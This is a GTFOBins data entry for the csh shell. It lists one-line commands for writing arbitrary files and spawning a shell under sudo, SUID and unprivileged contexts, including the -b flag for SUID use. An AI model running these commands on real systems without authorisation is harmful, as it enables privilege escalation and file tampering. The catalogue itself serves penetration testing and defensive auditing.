<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/csh -->
---
functions:
  file-write:
  - code: |-
      csh -c 'echo DATA >/path/to/output-file'
    contexts:
      sudo:
      suid:
        code: |-
          csh -c 'echo DATA >/path/to/output-file' -b
      unprivileged:
  shell:
  - code: |-
      csh
    contexts:
      sudo:
      suid:
        code: |-
          csh -b
      unprivileged:
...
